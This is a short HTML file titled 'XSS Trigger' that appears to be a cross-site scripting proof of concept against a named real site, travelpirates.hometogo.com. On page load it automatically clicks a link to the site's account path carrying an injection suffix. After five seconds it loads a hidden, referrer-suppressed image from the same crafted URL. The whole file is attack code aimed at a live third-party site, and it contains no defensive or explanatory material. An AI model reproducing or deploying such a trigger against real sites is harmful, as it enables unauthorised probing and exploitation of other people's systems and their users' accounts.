<!DOCTYPE html>
<html>
<head>
    <title>XSS Trigger</title>
</head>
<body>
    <a href="http://travelpirates.hometogo.com/account/><>" id="redirectLink" target="_blank">Click me to Redirect</a>

    <script>
    document.addEventListener("DOMContentLoaded", function() {
        document.getElementById("redirectLink").click();
    });
    
    // Add a delay to ensure the redirect happens before the XSS payload
    setTimeout(function() {
        var img = new Image();
        img.src = "https://travelpirates.hometogo.com/account/><>";
        img.setAttribute("style", "display:none;");
        img.setAttribute("referrerpolicy", "no-referrer");
        document.body.appendChild(img);
    }, 5000);
    </script>
</body>
</html>
